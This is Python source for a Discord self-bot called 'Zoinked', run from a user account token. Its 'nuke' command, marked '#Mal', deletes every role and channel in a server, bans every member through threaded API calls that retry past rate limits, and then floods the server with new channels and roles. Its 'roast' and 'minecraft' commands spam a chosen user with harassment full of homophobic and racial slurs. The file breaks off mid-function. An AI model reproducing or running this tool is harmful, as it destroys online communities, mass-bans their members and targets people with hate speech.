import asyncio

import discord
import requests
from discord.ext import commands
import os
import getpass
import time
import threading
import json
from datetime import datetime

os.system("cls")

ErrorLog = "\x1b[31;1m[\x1b[37;1m-\x1b[31;1m]\x1b[37;1m"


intents = discord.Intents.all()
intents.members = True

global token
global prefix

token = ""
prefix = ""


global memberLIST
global channelLIST
global roleLIST

global roleCount
global channelCount
global memberCount
global spamMessage
global purgeMessage
spamMessage = True
purgeMessage = True

with open("config.json") as file:
    data = json.load(file)
prefix = data["prefix"]
token = data["token"]
headers = {'Authorization': f'{token}'}


banner = '''
                    \x1b[36;1m███████\x1b[30;1m╗     \x1b[36;1m██████\x1b[30;1m╗\x1b[36;1m     ██\x1b[30;1m╗    \x1b[36;1m███\x1b[30;1m╗   \x1b[36;1m██\x1b[30;1m╗    \x1b[36;1m██\x1b[30;1m╗  \x1b[36;1m██\x1b[30;1m╗    \x1b[36;1m███████\x1b[30;1m╗    \x1b[36;1m██████\x1b[30;1m╗ 
                    \x1b[30;1m╚══\x1b[36;1m███\x1b[30;1m╔╝    \x1b[36;1m██\x1b[30;1m╔═══\x1b[36;1m██╗    ██\x1b[30;1m║    \x1b[36;1m████\x1b[30;1m╗  \x1b[36;1m██\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m║ \x1b[36;1m██\x1b[30;1m╔╝    \x1b[36;1m██\x1b[30;1m╔════╝    \x1b[36;1m██\x1b[30;1m╔══\x1b[36;1m██\x1b[30;1m╗
                    \x1b[36;1m  ███\x1b[30;1m╔╝     \x1b[36;1m██\x1b[30;1m║   \x1b[36;1m██║    ██\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m╔\x1b[36;1m██\x1b[30;1m╗ \x1b[36;1m██\x1b[30;1m║    \x1b[36;1m█████\x1b[30;1m╔╝     \x1b[36;1m█████\x1b[30;1m╗      \x1b[36;1m██\x1b[30;1m║  \x1b[36;1m██\x1b[30;1m║
                    \x1b[36;1m ███\x1b[30;1m╔╝      \x1b[36;1m██\x1b[30;1m║   \x1b[36;1m██║    ██\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m║╚\x1b[36;1m██\x1b[30;1m╗\x1b[36;1m██\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m╔═\x1b[36;1m██\x1b[30;1m╗     \x1b[36;1m██\x1b[30;1m╔══╝      \x1b[36;1m██\x1b[30;1m║  \x1b[36;1m██\x1b[30;1m║
                    \x1b[36;1m███████\x1b[30;1m╗    \x1b[30;1m╚\x1b[36;1m██████\x1b[30;1m╔╝    \x1b[36;1m██\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m║ ╚\x1b[36;1m████\x1b[30;1m║    \x1b[36;1m██\x1b[30;1m║  \x1b[36;1m██\x1b[30;1m╗    \x1b[36;1m███████\x1b[30;1m╗    \x1b[36;1m██████\x1b[30;1m╔╝
                    \x1b[30;1m╚══════╝     ╚═════╝     ╚═╝    ╚═╝  ╚═══╝    ╚═╝  ╚═╝    ╚══════╝    ╚═════╝'''

def get_prefix(client,message):
    with open("config.json") as file:
        data = json.load(file)
    prefix = data["prefix"]

    return prefix

client = commands.Bot(command_prefix=get_prefix, case_insensitive=True, intents=intents, self_bot=True)
client.remove_command("help")

prefix = get_prefix("","")


def ban(guild,member):
    try:

        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:

                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[33;1mrate_limited\x1b[30;1m]\x1b[30;1m•Sleeping for {str(r.json()['retry_after'])}\x1b[37;1m")

                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mbanned_user\x1b[30;2m][\x1b[36;1m•{member.name}\x1b[30;1m]\x1b[37;1m")

                    break
                else:
                    console_log_error("Failed to ban user")
                    break
    except:
        pass



def DeleteChannel(guild,channel):
    try:

        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[33;1mrate_limited\x1b[30;1m]\x1b[30;1m•Sleeping for {str(r.json()['retry_after'])}\x1b[37;1m")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mdeleted_channel\x1b[30;1m]\x1b[37;1m")

                    break
                else:
                    console_log_error("Failed to delete channel")
                    break
    except:
        pass

def DeleteRole(guild,role):
    try:

        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[33;1mrate_limited\x1b[30;1m]\x1b[30;1m•Sleeping for {str(r.json()['retry_after'])}\x1b[37;1m")
                time.sleep(r.json()['retry_after'])



            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mdeleted_role\x1b[30;1m]\x1b[37;1m")
                    break
                else:
                    console_log_error("Failed to delete role")
                    break
    except:
        pass

def CreateRole(guild,roleName):
    try:

        while True:
            json = {'name': roleName}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[33;1mrate_limited\x1b[30;1m]\x1b[30;1m•Sleeping for {str(r.json()['retry_after'])}\x1b[37;1m")

                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mcreated_role\x1b[30;1m]\x1b[37;1m")
                    break
                else:
                    console_log_error("Failed to create role")
                    break
    except:
        pass

def CreateChannel(guild,channelName):
    try:
        while True:
            json = {'name': channelName, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[33;1mrate_limited\x1b[30;1m]\x1b[30;1m•Sleeping for {str(r.json()['retry_after'])}\x1b[37;1m")
                time.sleep(r.json()['retry_after'])

            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mcreate_channel\x1b[30;1m]\x1b[37;1m")

                    break
                else:
                    console_log_error("Failed to create channel")
                    break
    except:
        pass

def load():
    global token
    global prefix

    if prefix == "":
        prefix = input("\x1b[35;1m< \x1b[37;1mPrefix: ")
        jsonDATA = {"prefix": prefix, "token": token}
        with open("config.json", "w") as f:
            json.dump(jsonDATA,f,indent=4)
        print("Restart")
        time.sleep(5)
        exit()


    if token == "":
        token = input("\x1b[35;1m< \x1b[37;1mToken: ")
        jsonDATA = {"prefix": prefix, "token": token}
        with open("config.json", "w") as f:
            json.dump(jsonDATA, f,indent=4)
        print("Restart")
        time.sleep(5)
        exit()
    else:
        login()

def login():
    global token
    global prefix

    try:

        client.run(token,bot=False)

    except:
        print(f"{ErrorLog} Invalid token {ErrorLog}")
        time.sleep(2)
        exit()

def now():
    now = datetime.now()
    nownow = now.strftime("%H:%M:%S")
    return nownow

def console_log_error(message):
    print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[31;1mERROR\x1b[30;1m]\x1b[30;1m•\x1b[37;1m{message}")

async def scraper(guildID):
    global memberLIST
    global channelLIST
    global roleLIST

    global roleCount
    global channelCount
    global memberCount

    guildOBJ = client.get_guild(int(guildID))
    members = await guildOBJ.chunk()

    memberLIST = []
    channelLIST = []
    roleLIST = []

    roleCount = 0
    channelCount = 0
    memberCount = 0

    for member in members:
        memberCount += 1
        memberLIST.append(member.id)

    for role in guildOBJ.roles:
        roleCount += 1
        roleLIST.append(role.id)

    for channel in guildOBJ.channels:
        channelCount += 1
        channelLIST.append(channel.id)


@client.event
async def on_ready():
    os.system("mode con: cols=120 lines=27 ")
    os.system(f"title Z o i n k e d")
    print(f"\x1b[30;1mWelcome \x1b[36;1m{client.user.name}\x1b[37;1m\n")
    print(banner)
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m")
    print(f"\x1b[30;1m                                               P r e f i x \x1b[37;1m=> \x1b[36;1m{prefix}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r n a m e \x1b[37;1m=> \x1b[36;1m{client.user.name}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r i d \x1b[37;1m=> \x1b[36;1m{client.user.id}\x1b[37;1m")
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m\n\n")

@client.event
async def on_message(message):

    await client.process_commands(message)

@client.command() #Gen
async def clear(ctx,help=""):
    await ctx.message.delete()
    time.sleep(0.1)

    if help.lower() == "help":
        embed = discord.Embed(title="Clear help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Clear", inline=False)
        embed.add_field(name="Description", value="Clears console", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    os.system("cls")
    print(banner)
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m")
    print(f"\x1b[30;1m                                               P r e f i x \x1b[37;1m=> \x1b[36;1m{prefix}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r n a m e \x1b[37;1m=> \x1b[36;1m{client.user.name}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r i d \x1b[37;1m=> \x1b[36;1m{client.user.id}\x1b[37;1m")
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m\n\n")

@client.command() #Gen
async def scrape(ctx,guildID=""):
    await ctx.message.delete()
    time.sleep(0.1)

    if guildID.lower() == "help":
        embed = discord.Embed(title="Scrape help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Scrape (**GUILD ID**)", inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)
        embed.add_field(name="Description", value="Gets info about a server", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    if guildID == "":



        if isinstance(ctx.channel, discord.channel.DMChannel):
            console_log_error("Need to be in server")
            return
        else:
            guildID = ctx.guild.id


    try:
        guild = client.get_guild(int(guildID))
    except:
        console_log_error("Invalid guild id")
        return

    await scraper(guildID)
    embed = discord.Embed(title="Server scraper",colour=0x9d00ff)
    embed.timestamp = datetime.now()
    embed.set_author(name=client.user.name + "#" + client.user.discriminator,icon_url=client.user.avatar_url)
    embed.add_field(name="Guild name",value=guild.name,inline=False)
    embed.add_field(name="Guild id",value=guild.id,inline=False)
    embed.add_field(name="Member count",value=memberCount,inline=False)
    embed.add_field(name="Channel count",value=channelCount,inline=False)
    embed.add_field(name="Role count",value=roleCount,inline=False)

    await ctx.send(embed=embed)

@client.command(aliases=["wizz"]) #Mal
async def nuke(ctx,guildID="help",channelAmount="",roleAmount="",channelName="",roleName=""):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":
        embed = discord.Embed(title="Nuke help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**Nuke (**GUILD ID**) (**CHANNEL AMOUNT**) (**ROLE AMOUNT**) (**CHANNEL NAME**) (**ROLE NAME**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)
        embed.add_field(name="Channel amount",value="Channel amount is the amount of channels being created",inline=False)
        embed.add_field(name="Role amount",value="Role amount is the amount of roles being created",inline=False)
        embed.add_field(name="Channel name",value="Name of the channels being created",inline=False)
        embed.add_field(name="Role name",value="Name of roles being created",inline=False)
        embed.add_field(name="Description", value="Deletes all roles and channels then bans all members then creates roles and channels", inline=False)
        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    if guildID == "":
        console_log_error("Missing guild id")

        return
    elif channelName == "":
        console_log_error("Missing channel name")

        return
    elif roleName == "":
        console_log_error("Missing role name")

        return
    elif channelAmount == "":
        console_log_error("Missing channel amount")

        return
    elif roleAmount == "":
        console_log_error("Missing role amount")

        return
    try:
        c = int(channelAmount)
        c += 1

    except ValueError:
        console_log_error(f"{channelAmount} is not a valid int")
    try:
        c = int(roleAmount)
        c += 1
    except ValueError:
        console_log_error(f"{roleAmount} is not a valid int")

    try:
        guild = client.get_guild(int(guildID))
    except:
        console_log_error("Invalid guild id")
        return
    try:
        await scraper(guildID)
    except Exception as e:
        console_log_error("Invalid guild id")
        return

    try:

        for role in roleLIST:
            threading.Thread(target=DeleteRole, args=(guildID, role,)).start()
        for member in memberLIST:
            threading.Thread(target=ban, args=(guildID, member,)).start()
        for channel in channelLIST:
            threading.Thread(target=DeleteChannel, args=(guildID, channel)).start()
        for i in range(int(channelAmount)):
            threading.Thread(target=CreateChannel, args=(guildID, channelName,)).start()
        for i in range(int(roleAmount)):
            threading.Thread(target=CreateRole, args=(guildID, roleName,)).start()
    except:
        pass

@client.command() #Gen
async def info(ctx,userID="help"):
    await ctx.message.delete()
    time.sleep(0.1)

    if userID.lower() == "help":
        embed = discord.Embed(title="Info help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Info (**USER ID**)", inline=False)
        embed.add_field(name="User ID", value="Copy the users ID", inline=False)
        embed.add_field(name="Description", value="Grabs information about the user", inline=False)
        await ctx.send(embed=embed)
        return


    user = await commands.converter.MemberConverter().convert(ctx,userID)


    embed = discord.Embed(title=f"User info for {user.name}#{user.discriminator}",color=0x9d00ff)
    embed.add_field(name="User ID",value=user.id,inline=False)
    embed.add_field(name="Icon URL",value=user.avatar_url,inline=False)
    embed.add_field(name="Creation date",value=user.created_at,inline=False)
    embed.timestamp = datetime.now()
    embed.set_thumbnail(url=user.avatar_url)
    await ctx.send(embed=embed)

@client.command() #Fun
async def roast(ctx,id="Help"):
    await ctx.message.delete()
    cooldown = 0.7
    time.sleep(0.1)

    if id.lower() == "help":

        embed = discord.Embed(title="Roast help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Roast (**USER ID**)", inline=False)
        embed.add_field(name="User ID", value="Copy the users ID", inline=False)
        embed.add_field(name="Description", value="Spams roasts at a user", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    user = await commands.converter.MemberConverter().convert(ctx,id)

    mention = user.mention
    await ctx.send(f'No one loves you faggot {mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"You like fortnite porn skid {mention}")
    await ctx.send(f"Whats a 5 way tcp udp milkshake skid!?!??!?! {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f'Your a fur faggot go commit toaster bath skid {mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"Your dad dosent love you jk he left faggot {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"bet your mom dosent love you {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"You can only code batch faggot {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"die your such a skid {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f'```10 Reasons why your a skid!\n\n1.You can only make pingers\n2.You cant code\n3.{client.user.display_name} Owns priority your nothing\n4.You will never be anything\n5.You smell like cheese\n6.your the reason why i hate niggers\n6.0 pr dog water\n7.1v1 snipers only ill shit on you\n8.Your a skid and skid rip 247\n9.Nigger\n10.I {client.user.display_name} ran you skid\n```')
    await asyncio.sleep(cooldown)
    await ctx.send(f"How many holes do a pussy have??!? {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f'Bet you look like a fucking mc chicken retard lmfaoooo {mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"Take a gawd dawm shower retard you smell like shit {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"Your a crack baby lmfao {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"You smell sooo gawd dawm bad vultures run away from you {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"You prob DDoS in 2021 actually dog water {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"Your 99.8% a wanna be haxer {mention}")
    await asyncio.sleep(cooldown)
    await ctx.send("Bet you cant name one line of python")
    await asyncio.sleep(cooldown)
    await ctx.send(f"Here is a educational video of how your a skid \nhttps://cdn.discordapp.com/attachments/786042166727933959/800912194647752714/output_free.mp4")

@client.command() #Fun
async def drip(ctx,help=None):
    await ctx.message.delete()
    time.sleep(0.1)
    if help is None:
        await ctx.send('''
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⢿⣿⣦⠈⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣶⣦⣍⠐⢼⣿⣿⣧⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⣄⣿⣿⣿⣦⣴⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢠⣄⣒⣚⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⡽⣿⠟⢃⣿⠟⡉⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠶⢯⣭⣿⢹⡟⢶⣗⠀⢸⠇⢁⣠⠫⠟⣹⣿⣯⡭⠶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢙⣄⠣⠁⠈⠓⠊⠐⠃⠀⠀⣰⣿⣏⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢉⣽⠀⠀⠀⠀⠀⠀⠀⣿⣯⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⡀⠀⠀⠀⠀⠀⠀⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣷⡀⠀⠀⠀⠀⢠⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠘⢛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣧⣀⡀⠶⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣠⣀⣀⣿⡿⠃⢢⣠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠿⣿⡿⣷⡿⠿⣿⢿⡿⠩⢹⣿⡟⠉⠉⠉⢹⣿⢻⠛⠛⠻⢿⣿⣷⣿⣿⠉⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⢶⣿⣦⣿⣷⡇⢁⠚⡇⠐⢀⣿⣷⣤⣤⣤⣿⣧⣀⣠⣇⡰⢀⡿⣿⣿⣷⣾⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣵⡎⠹⣿⣿⣿⣁⣾⢻⣿⢻⣟⣩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣾⣿⡿⠛⠛⢛⡟⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣞⣰⠞⣩⣿⣻⡇⢠⠃⠸⠉⠙⣿⣿⣿⣿⢈⡁⠤⠁⠌⢉⢙⣿⣐⣧⣤⣾⢇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡿⢿⢋⡍⢇⠛⣿⣧⣼⣦⣴⣔⣠⣿⣿⣿⣯⣦⣤⣦⣤⣦⣄⣸⡻⢛⠋⠉⠻⠿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠀⣆⣷⣴⣶⠿⣿⡿⣿⢿⣿⣿⣿⣿⣿⢿⡿⢿⣿⢉⠉⣿⣿⣷⣾⣤⣭⡁⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⣾⣿⣿⣿⣿⠐⣉⣌⠇⠐⠁⡄⣿⣿⣿⠈⡠⢾⡇⠠⠠⣼⣽⡟⢣⠄⣹⣿⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣉⠁⣿⣷⣿⡟⢿⡵⣾⣶⣦⣿⣿⣿⣴⣷⣾⣷⠖⡴⠿⣿⣿⠷⠚⢛⡻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⣿⣿⣿⣧⠐⡅⢘⠃⣿⣿⣿⣟⠿⡿⣿⣧⣈⠴⢃⠘⣻⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢻⣿⠃⢸⣿⣶⣿⡿⡟⢉⣿⢿⣻⣼⣧⠂⠛⢿⣷⣟⣀⣥⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣏⡙⣿⣾⣿⣿⠿⢄⠉⣸⡿⠁⠉⠉⠟⢬⢛⢚⠻⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣦⣅⣙⣿⣧⣮⣬⣽⡟⠀⠀⠀⠀⢶⣶⣮⢧⢠⠙⣰⢹⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⣈⣽⣶⣿⣿⣷⣼⠟⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢥⣏⢿⢯⣿⡟⠀⣿⣿⣿⣶⣄⣠⢈⠲⠟⣛⠏⣍⣏⠬⣄⡺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣾⣿⣃⣧⣿⣿⣿⣿⣿⣧⣒⣴⣦⣾⣶⣾⣶⣿⡇⠀⠀⠀     
            ''')
    else:
        embed = discord.Embed(title="Drip help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**Drip",inline=False)
        embed.add_field(name="Description",value="Drip god",inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

@client.command() #Fun
async def minecraft(ctx,id="help"):

    await ctx.message.delete()
    time.sleep(0.1)

    if id.lower() == "help":
        embed = discord.Embed(title="Roast help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Minecraft (**USER ID**)", inline=False)
        embed.add_field(name="User ID", value="Copy the users ID", inline=False)
        embed.add_field(name="Description", value="Roast command but in minecraft enchantment table", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    cooldown = 0.7
    user = await commands.converter.MemberConverter().convert(ctx,id)

    mention = user.mention
    await ctx.send(f'```リ𝙹 𝙹リᒷ ꖎ𝙹⍊ᒷᓭ ||𝙹⚍ ⎓ᔑ⊣⊣𝙹ℸ ̣ ```{mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"```||𝙹⚍ ꖎ╎ꖌᒷ ⎓𝙹∷ℸ ̣ リ╎ℸ ̣ ᒷ !¡𝙹∷リ ᓭꖌ╎↸ ```{mention}")
    await ctx.send(f"```∴⍑ᔑℸ ̣ ᓭ ᔑ 5 ∴ᔑ|| ℸ ̣ ᓵ!¡ ⚍↸!¡ ᒲ╎ꖎꖌᓭ⍑ᔑꖌᒷ ᓭꖌ╎↸!?!??!?! ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f'```||𝙹⚍∷ ᔑ ⎓⚍∷ ⎓ᔑ⊣⊣𝙹ℸ ̣  ⊣𝙹 ᓵ𝙹ᒲᒲ╎ℸ ̣  ℸ ̣ 𝙹ᔑᓭℸ ̣ ᒷ∷ ʖᔑℸ ̣ ⍑ ᓭꖌ╎↸ ```{mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"```||𝙹⚍∷ ↸ᔑ↸ ↸𝙹ᓭᒷリℸ ̣  ꖎ𝙹⍊ᒷ ||𝙹⚍ ⋮ꖌ ⍑ᒷ ꖎᒷ⎓ℸ ̣  ⎓ᔑ⊣⊣𝙹ℸ ̣ ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"```ʖᒷℸ ̣  ||𝙹⚍∷ ᒲ𝙹ᒲ ↸𝙹ᓭᒷリℸ ̣  ꖎ𝙹⍊ᒷ ||𝙹⚍ ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"```||𝙹⚍ ᓵᔑリ 𝙹リꖎ|| ᓵ𝙹↸ᒷ ʖᔑℸ ̣ ᓵ⍑ ⎓ᔑ⊣⊣𝙹ℸ ̣ ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"```↸╎ᒷ ||𝙹⚍∷ ᓭ⚍ᓵ⍑ ᔑ ᓭꖌ╎↸ ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f"```⍑𝙹∴ ᒲᔑリ|| ⍑𝙹ꖎᒷᓭ ↸𝙹 ᔑ !¡⚍ᓭᓭ|| ⍑ᔑ⍊ᒷ??!? ```{mention}")
    await asyncio.sleep(cooldown)
    await ctx.send(f'```ʖᒷℸ ̣  ||𝙹⚍ ꖎ𝙹𝙹ꖌ ꖎ╎ꖌᒷ ᔑ ⎓⚍ᓵꖌ╎リ⊣ ᒲᓵ ᓵ⍑╎ᓵꖌᒷリ ∷ᒷℸ ̣ ᔑ∷↸ ꖎᒲ⎓ᔑ𝙹𝙹𝙹𝙹 ```{mention}')
    await asyncio.sleep(cooldown)
    await ctx.send(f"```Tᔑꖌᒷ ᔑ ⊣ᔑ∴↸ ↸ᔑ∴ᒲ ᓭ⍑𝙹∴ᒷ∷ ∷ᒷℸ ̣ ᔑ∷↸ ||𝙹⚍ ᓭᒲᒷꖎꖎ ꖎ╎ꖌᒷ ᓭ⍑╎ℸ ̣ ```{mention}")

@client.command() #Gen
async def groupleave(ctx,help=None):

    await ctx.message.delete()
